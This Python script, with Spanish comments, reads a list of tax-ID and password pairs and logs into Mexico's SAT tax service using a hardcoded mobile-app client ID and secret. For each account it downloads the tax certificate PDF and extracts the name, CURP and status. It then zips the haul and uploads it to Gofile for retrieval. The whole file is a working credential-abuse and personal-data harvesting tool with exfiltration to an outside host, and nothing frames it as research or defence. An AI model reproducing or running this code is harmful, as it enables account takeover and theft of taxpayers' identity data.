import requests
import base64
import os
import zipfile

CLIENT_ID = "fe7bad7c-6dea-4834-8f40-1fa99620613b"
CLIENT_SECRET = "vhHgI-1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoYHOlo6Fb9pnLXZNWwuGnUj-zijmumfWOGUhlaLer8LACwNA"

def run():
    if not os.path.exists("usuarios.txt"):
        print("? Error: No existe usuarios.txt")
        return

    os.makedirs("PDFS_SAT", exist_ok=True)
    session = requests.Session()
    reporte_txt = "=== REPORTE DETALLADO DE CAPTURAS ===\n\n"

    with open("usuarios.txt", "r") as f:
        lineas = f.readlines()

    for num_linea, linea in enumerate(lineas, 1):
        linea = linea.strip()
        if not linea or ":" not in linea:
            continue
        
        # Corrección del error: maxsplit=1 por si la contraseña tiene ":"
        partes = linea.split(":", 1)
        if len(partes) != 2:
            print(f"?? Saltando línea {num_linea}: Formato incorrecto")
            continue
            
        rfc, pwd = partes
        rfc = rfc.strip().upper()
        pwd = pwd.strip()

        print(f"?? Procesando: {rfc}")

        # 1. AUTENTICACIÓN
        token_url = "https://login.cloudb.sat.gob.mx/nidp/oauth/nam/token"
        params = {
            "grant_type": "password",
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "username": rfc,
            "password": pwd,
            "scope": "satmovil",
            "resourceServer": "satmovil"
        }
        
        try:
            # Usamos params en lugar de pegarlo en la URL para evitar errores de caracteres
            r_auth = session.post(token_url, params=params, timeout=15)
            data_token = r_auth.json()
            token = data_token.get("access_token")
            
            if not token:
                print(f"  [!] Falló login para {rfc}: {data_token.get('error_description', 'Credenciales incorrectas')}")
                continue

            headers = {"Authorization": f"bearer {token}", "User-Agent": "Dart/3.5 (dart:io)"}

            # 2. DESCARGA DE PDF
            res_pdf = session.get(f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/csf/{rfc}", headers=headers, timeout=15)
            pdf_data = res_pdf.json().get("constancia")
            if pdf_data:
                with open(f"PDFS_SAT/{rfc}.pdf", "wb") as f_pdf:
                    f_pdf.write(base64.b64decode(pdf_data))
                print(f"  [+] PDF Guardado")

            # 3. CAPTURA DE INFORMACIÓN
            res_info = session.get(f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/dwh/miinformacion/{rfc}", headers=headers, timeout=15)
            info = res_info.json()

            datos = (
                f"RFC: {rfc}\n"
                f"NOMBRE: {info.get('tradename', 'N/A')}\n"
                f"CURP: {info.get('curp', 'N/A')}\n"
                f"STATUS: {info.get('statusDescription', 'N/A')}\n"
                f"-------------------------------------------\n"
            )
            reporte_txt += datos

        except Exception as e:
            print(f"  [!] Error inesperado en {rfc}: {e}")

    # 4. CREAR ZIP Y SUBIR
    if os.listdir("PDFS_SAT") or len(reporte_txt) > 50:
        with open("REPORTE_CAPTURAS.txt", "w", encoding="utf-8") as f_rep:
            f_rep.write(reporte_txt)

        zip_name = "TODO_SAT.zip"
        with zipfile.ZipFile(zip_name, 'w') as zipf:
            if os.path.exists("REPORTE_CAPTURAS.txt"):
                zipf.write("REPORTE_CAPTURAS.txt")
            for arch in os.listdir("PDFS_SAT"):
                zipf.write(f"PDFS_SAT/{arch}", f"PDFS/{arch}")

        print("\n?? Subiendo todo a Gofile...")
        try:
            server_info = requests.get("https://api.gofile.io/servers").json()
            server = server_info["data"]["servers"][0]["name"]
            with open(zip_name, "rb") as f_zip:
                up = requests.post(f"https://{server}.gofile.io/contents/uploadfile", files={"file": f_zip}).json()
            
            if up["status"] == "ok":
                print(f"\n? LINK GOFILE: {up['data']['downloadPage']}")
            else:
                print("? Error al subir a Gofile")
        except:
            print("? Error de conexión con Gofile")
    else:
        print("? No se obtuvo información de ninguna cuenta.")

if __name__ == "__main__":
    run()
